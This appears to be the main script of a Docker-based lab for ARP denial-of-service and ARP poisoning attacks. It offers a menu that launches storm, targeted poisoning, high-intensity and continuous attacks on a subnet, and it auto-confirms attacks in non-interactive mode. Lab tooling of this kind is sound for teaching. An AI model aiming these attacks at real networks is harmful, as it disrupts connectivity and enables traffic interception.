#!/usr/bin/env python3
"""
Attacker Container Main Script
ARP DoS Storm Attack in Docker Environment
In this code it is the main code for attacking the network using ARP storm attacks.
This script is designed to run in a Docker container and orchestrate ARP-based attacks

So, what does it do is the following
firstly it sets up the environment from the docker-compose running, the ips of attacker, victim, gateway and observer
it then createsd necesary directories which is used to log saving or result saving
The shows a banner to show that its workign is starting
It may wait for the observer if it is not ready
Then it will show the main menu, giving us all the attack options available

it used the ARP Storms attacker class to perform various ARP-based attacks
For highly intesity node, it uses C++ file 
The attacks are multi threaded

Then it logs the information in the app/logs

"""

import os
import sys
import time
import json
import signal
import threading
from datetime import datetime
import subprocess

# Add current directory to path
sys.path.insert(0, '/app')

try:
    from arp_dos_storm import ARPStormAttacker
    import psutil
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
except ImportError as e:
    print(f"Import error: {e}")
    print("Installing missing dependencies...")
    subprocess.run([sys.executable, "-m", "pip", "install", "rich", "psutil"])
    from arp_dos_storm import ARPStormAttacker
    import psutil
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel

console = Console()

class DockerAttacker:
    """Docker-based ARP attack orchestrator"""
    
    def __init__(self):
        self.attacker_ip = os.getenv('ATTACKER_IP', '10.0.1.10')
        self.victim_ip = os.getenv('VICTIM_IP', '10.0.1.20')
        self.observer_ip = os.getenv('OBSERVER_IP', '10.0.1.30')
        self.gateway_ip = os.getenv('GATEWAY_IP', '10.0.1.1')
        self.subnet = os.getenv('SUBNET', '10.0.1')
        
        self.attacker = ARPStormAttacker()
        self.running = False
        self.attack_thread = None
        
        # Setup signal handlers
        signal.signal(signal.SIGTERM, self.signal_handler)
        signal.signal(signal.SIGINT, self.signal_handler)
        
        # Ensure directories exist
        os.makedirs('/app/logs', exist_ok=True)
        os.makedirs('/app/results', exist_ok=True)
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        console.print(f"\n[yellow]Received signal {signum}, shutting down...[/yellow]")
        self.stop_attack()
        sys.exit(0)
    
    def log_event(self, event_type, message, data=None):
        """Log events to file"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'container': 'attacker',
            'event_type': event_type,
            'message': message,
            'data': data or {}
        }
        
        log_file = f"/app/logs/attacker_{datetime.now().strftime('%Y%m%d')}.log"
        with open(log_file, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    
    def display_banner(self):
        """Display startup banner"""
        banner_text = """
    ARP DoS Storm Attacker Container
    Educational/Research Purpose Only
    
    ⚠️  WARNING: This container can disrupt networks!
    """
        
        console.print(Panel(banner_text, style="bold red", title="🔥 ATTACKER"))
        
        # Display network configuration
        table = Table(title="Network Configuration")
        table.add_column("Parameter", style="cyan")
        table.add_column("Value", style="green")
        
        table.add_row("Attacker IP", self.attacker_ip)
        table.add_row("Victim IP", self.victim_ip)
        table.add_row("Observer IP", self.observer_ip)
        table.add_row("Gateway IP", self.gateway_ip)
        table.add_row("Subnet", f"{self.subnet}.0/24")
        
        console.print(table)
    
    def check_network_connectivity(self):
        """Check connectivity to other containers"""
        console.print("\n[bold yellow]Checking network connectivity...[/bold yellow]")
        
        targets = {
            'Victim': self.victim_ip,
            'Observer': self.observer_ip,
            'Gateway': self.gateway_ip
        }
        
        connectivity_table = Table(title="Connectivity Check")
        connectivity_table.add_column("Target", style="cyan")
        connectivity_table.add_column("IP", style="white")
        connectivity_table.add_column("Status", style="green")
        
        for name, ip in targets.items():
            # for each target of the targets
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '2', ip], 
                                      capture_output=True, text=True) #sends one packet 2 second timeout captures output for analyzing
                status = "✅ Reachable" if result.returncode == 0 else "❌ Unreachable"
                style = "green" if result.returncode == 0 else "red"
            except Exception as e:
                status = f"❌ Error: {e}"
                style = "red"
            
            connectivity_table.add_row(name, ip, f"[{style}]{status}[/{style}]") # add the information in the table
        
        console.print(connectivity_table)
        self.log_event("connectivity_check", "Network connectivity verified", targets)
    
    def wait_for_observer(self):
        """Wait for observer to be ready"""
        console.print(f"\n[yellow]Waiting for observer container to be ready...[/yellow]")
        
        max_attempts = 30
        for attempt in range(max_attempts):
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', self.observer_ip],
                                      capture_output=True)
                if result.returncode == 0:
                    console.print(f"[green]Observer is ready![/green]")
                    return True
                
                time.sleep(2)
                console.print(f"[dim]Attempt {attempt + 1}/{max_attempts}...[/dim]")
                
            except Exception as e:
                console.print(f"[red]Error checking observer: {e}[/red]")
        
        console.print(f"[red]Observer not ready after {max_attempts} attempts[/red]")
        return False
    
    def interactive_menu(self):
        """Interactive attack menu"""
        while True:
            console.print("\n" + "="*50)
            console.print("[bold cyan]🔥 ARP ATTACK MENU[/bold cyan]")
            console.print("="*50)
            
            menu_options = [
                "1. Basic ARP Storm Attack",
                "2. Targeted Victim Poisoning", 
                "3. High-Intensity Storm",
                "4. Continuous Low-Level Attack",
                "5. Custom Attack Parameters",
                "6. Network Reconnaissance",
                "7. View System Status",
                "8. View Attack Logs",
                "0. Exit"
            ]
            
            for option in menu_options:
                console.print(f"  {option}")
            
            try:
                choice = console.input("\n[bold yellow]Select option (0-8): [/bold yellow]").strip()
                
                if choice == "0":
                    break
                elif choice == "1":
                    self.basic_storm_attack()
                elif choice == "2":
                    self.targeted_poisoning()
                elif choice == "3":
                    self.high_intensity_attack()
                elif choice == "4":
                    self.continuous_attack()
                elif choice == "5":
                    self.custom_attack()
                elif choice == "6":
                    self.network_reconnaissance()
                elif choice == "7":
                    self.show_system_status()
                elif choice == "8":
                    self.view_logs()
                else:
                    console.print("[red]Invalid option![/red]")
                    
            except KeyboardInterrupt:
                console.print(f"\n[yellow]Menu interrupted[/yellow]")
                break
            except Exception as e:
                console.print(f"[red]Menu error: {e}[/red]")
    
    def basic_storm_attack(self):
        """Basic ARP storm attack"""
        console.print(f"\n[bold red]🚀 Launching Basic ARP Storm Attack[/bold red]")
        
        duration = 60
        threads = 4
        rate = 100
        
        console.print(f"Target: {self.subnet}.0/24")
        console.print(f"Duration: {duration} seconds")
        console.print(f"Threads: {threads}")
        console.print(f"Rate: {rate} packets/second per thread")
        
        confirm = console.input("\n[yellow]Proceed with attack? (yes/no): [/yellow]")
        if confirm.lower() != 'yes':
            console.print("[yellow]Attack cancelled[/yellow]")
            return
        
        self.log_event("attack_start", "Basic storm attack initiated", {
            'target_subnet': self.subnet,
            'duration': duration,
            'threads': threads,
            'rate': rate
        })
        
        try:
            self.attacker.start_storm_attack(
                target_subnet=self.subnet,
                duration=duration,
                num_threads=threads,
                packets_per_second=rate
            )
            
            self.log_event("attack_complete", "Basic storm attack completed", {
                'packets_sent': self.attacker.packet_count
            })
            
        except Exception as e:
            console.print(f"[red]Attack failed: {e}[/red]")
            self.log_event("attack_error", f"Attack failed: {e}")
    
    def targeted_poisoning(self):
        """Targeted ARP poisoning attack"""
        console.print(f"\n[bold red]🎯 Launching Targeted Poisoning Attack[/bold red]")
        
        targets = [self.victim_ip]
        duration = 120
        
        console.print(f"Targets: {targets}")
        console.print(f"Gateway: {self.gateway_ip}")
        console.print(f"Duration: {duration} seconds")
        
        confirm = console.input("\n[yellow]Proceed with poisoning? (yes/no): [/yellow]")
        if confirm.lower() != 'yes':
            console.print("[yellow]Attack cancelled[/yellow]")
            return
        
        self.log_event("poisoning_start", "Targeted poisoning initiated", {
            'targets': targets,
            'gateway': self.gateway_ip,
            'duration': duration
        })
        
        try:
            self.attacker.start_poison_attack(
                target_ips=targets,
                gateway_ip=self.gateway_ip,
                duration=duration
            )
            
            self.log_event("poisoning_complete", "Targeted poisoning completed", {
                'packets_sent': self.attacker.packet_count
            })
            
        except Exception as e:
            console.print(f"[red]Poisoning failed: {e}[/red]")
            self.log_event("poisoning_error", f"Poisoning failed: {e}")
    
    def high_intensity_attack(self):
        """High-intensity attack using C++ tool"""
        console.print(f"\n[bold red]⚡ Launching High-Intensity Attack (C++)[/bold red]")
        
        duration = 30
        threads = 8
        rate = 500
        
        console.print(f"[red]WARNING: This is a high-intensity attack![/red]")
        console.print(f"Duration: {duration} seconds")
        console.print(f"Threads: {threads}")
        console.print(f"Rate: {rate} packets/second per thread")
        console.print(f"Total Rate: {rate * threads} packets/second")
        
        confirm = console.input("\n[yellow]Proceed with high-intensity attack? (yes/no): [/yellow]")
        if confirm.lower() != 'yes':
            console.print("[yellow]Attack cancelled[/yellow]")
            return
        
        self.log_event("high_intensity_start", "High-intensity attack initiated", {
            'duration': duration,
            'threads': threads,
            'rate': rate
        })
        
        try:
            # Use C++ tool if available
            cpp_tool = "/app/arp_storm"
            if os.path.exists(cpp_tool):
                cmd = [
                    cpp_tool,
                    "--subnet", self.subnet,
                    "--duration", str(duration),
                    "--threads", str(threads),
                    "--rate", str(rate)
                ]
                
                # Auto-confirm for Docker environment
                process = subprocess.Popen(cmd, stdin=subprocess.PIPE, 
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                         text=True)
                
                # Send "yes" to confirmation prompt
                stdout, stderr = process.communicate(input="yes\n")
                
                console.print(f"[green]C++ attack completed[/green]")
                console.print(f"Output: {stdout}")
                if stderr:
                    console.print(f"Errors: {stderr}")
            else:
                console.print(f"[yellow]C++ tool not available, using Python version[/yellow]")
                self.attacker.start_storm_attack(
                    target_subnet=self.subnet,
                    duration=duration,
                    num_threads=threads,
                    packets_per_second=rate
                )
            
            self.log_event("high_intensity_complete", "High-intensity attack completed")
            
        except Exception as e:
            console.print(f"[red]High-intensity attack failed: {e}[/red]")
            self.log_event("high_intensity_error", f"Attack failed: {e}")
    
    def continuous_attack(self):
        """Continuous low-level attack"""
        console.print(f"\n[bold red]♾️  Launching Continuous Attack[/bold red]")
        console.print(f"[yellow]This will run until manually stopped[/yellow]")
        
        confirm = console.input("\n[yellow]Start continuous attack? (yes/no): [/yellow]")
        if confirm.lower() != 'yes':
            return
        
        self.running = True
        
        def continuous_worker():
            while self.running:
                try:
                    # Run small bursts
                    self.attacker.start_storm_attack(
                        target_subnet=self.subnet,
                        duration=30,
                        num_threads=2,
                        packets_per_second=25
                    )
                    
                    if self.running:
                        time.sleep(10)  # Brief pause between bursts
                        
                except Exception as e:
                    console.print(f"[red]Continuous attack error: {e}[/red]")
                    time.sleep(5)
        
        self.attack_thread = threading.Thread(target=continuous_worker)
        self.attack_thread.start()
        
        console.print(f"[green]Continuous attack started. Press Ctrl+C to stop.[/green]")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            console.print(f"\n[yellow]Stopping continuous attack...[/yellow]")
            self.stop_attack()
    
    def custom_attack(self):
        """Custom attack with user-specified parameters"""
        console.print(f"\n[bold cyan]🛠️  Custom Attack Configuration[/bold cyan]")
        
        try:
            duration = int(console.input("Duration (seconds) [60]: ") or "60")
            threads = int(console.input("Number of threads [4]: ") or "4")
            rate = int(console.input("Packets per second per thread [100]: ") or "100")
            
            attack_type = console.input("Attack type (storm/poison) [storm]: ") or "storm"
            
            console.print(f"\n[bold yellow]Configuration:[/bold yellow]")
            console.print(f"Duration: {duration} seconds")
            console.print(f"Threads: {threads}")
            console.print(f"Rate: {rate} pps per thread")
            console.print(f"Type: {attack_type}")
            
            confirm = console.input("\n[yellow]Execute custom attack? (yes/no): [/yellow]")
            if confirm.lower() != 'yes':
                return
            
            self.log_event("custom_attack_start", "Custom attack initiated", {
                'duration': duration,
                'threads': threads,
                'rate': rate,
                'type': attack_type
            })
            
            if attack_type == "storm":
                self.attacker.start_storm_attack(
                    target_subnet=self.subnet,
                    duration=duration,
                    num_threads=threads,
                    packets_per_second=rate
                )
            elif attack_type == "poison":
                self.attacker.start_poison_attack(
                    target_ips=[self.victim_ip],
                    gateway_ip=self.gateway_ip,
                    duration=duration
                )
            
            self.log_event("custom_attack_complete", "Custom attack completed")
            
        except (ValueError, KeyboardInterrupt) as e:
            console.print(f"[red]Custom attack configuration error: {e}[/red]")
    
    def network_reconnaissance(self):
        """Perform network reconnaissance"""
        console.print(f"\n[bold cyan]🔍 Network Reconnaissance[/bold cyan]")
        
        # ARP table
        console.print(f"\n[yellow]Current ARP table:[/yellow]")
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            console.print(result.stdout)
        except Exception as e:
            console.print(f"[red]ARP table error: {e}[/red]")
        
        # Network interfaces
        console.print(f"\n[yellow]Network interfaces:[/yellow]")
        try:
            result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True)
            console.print(result.stdout)
        except Exception as e:
            console.print(f"[red]Interface error: {e}[/red]")
    
    def show_system_status(self):
        """Show system status"""
        console.print(f"\n[bold cyan]📊 System Status[/bold cyan]")
        
        # CPU and memory
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        
        status_table = Table(title="System Resources")
        status_table.add_column("Metric", style="cyan")
        status_table.add_column("Value", style="green")
        
        status_table.add_row("CPU Usage", f"{cpu_percent:.1f}%")
        status_table.add_row("Memory Usage", f"{memory.percent:.1f}%")
        status_table.add_row("Available Memory", f"{memory.available / 1024 / 1024:.0f} MB")
        
        console.print(status_table)
    
    def view_logs(self):
        """View recent attack logs"""
        console.print(f"\n[bold cyan]📋 Recent Attack Logs[/bold cyan]")
        
        log_file = f"/app/logs/attacker_{datetime.now().strftime('%Y%m%d')}.log"
        try:
            with open(log_file, 'r') as f:
                lines = f.readlines()
                
            # Show last 10 entries
            for line in lines[-10:]:
                try:
                    entry = json.loads(line.strip())
                    timestamp = entry['timestamp']
                    event_type = entry['event_type']
                    message = entry['message']
                    console.print(f"[dim]{timestamp}[/dim] [{event_type}] {message}")
                except:
                    console.print(line.strip())
                    
        except FileNotFoundError:
            console.print("[yellow]No log file found[/yellow]")
        except Exception as e:
            console.print(f"[red]Error reading logs: {e}[/red]")
    
    def stop_attack(self):
        """Stop any running attacks"""
        self.running = False
        if self.attacker:
            self.attacker.stop_attack()
        
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        
        console.print("[green]All attacks stopped[/green]")
    
    def run(self):
        """Main container runtime"""
        self.display_banner()
        
        # Log startup
        self.log_event("container_start", "Attacker container started", {
            'network_config': {
                'attacker_ip': self.attacker_ip,
                'victim_ip': self.victim_ip,
                'observer_ip': self.observer_ip,
                'subnet': self.subnet
            }
        })
        
        # Wait for network
        time.sleep(5)
        
        # Check connectivity
        self.check_network_connectivity()
        
        # Wait for observer
        if not self.wait_for_observer():
            console.print("[yellow]Proceeding without observer confirmation[/yellow]")
        
        console.print(f"\n[green]🚀 Attacker container ready![/green]")
        
        # Check if running in interactive mode
        if os.isatty(sys.stdin.fileno()):
            try:
                self.interactive_menu()
            except KeyboardInterrupt:
                console.print(f"\n[yellow]Interactive mode interrupted[/yellow]")
        else:
            # Non-interactive mode - run default attack
            console.print(f"[yellow]Running in non-interactive mode[/yellow]")
            time.sleep(10)  # Give observer time to start
            self.basic_storm_attack()
        
        self.stop_attack()
        self.log_event("container_stop", "Attacker container stopped")

def main():
    """Main entry point"""
    try:
        attacker = DockerAttacker()
        attacker.run()
    except Exception as e:
        console.print(f"[red]Fatal error: {e}[/red]")
        sys.exit(1)

if __name__ == "__main__":
    main()
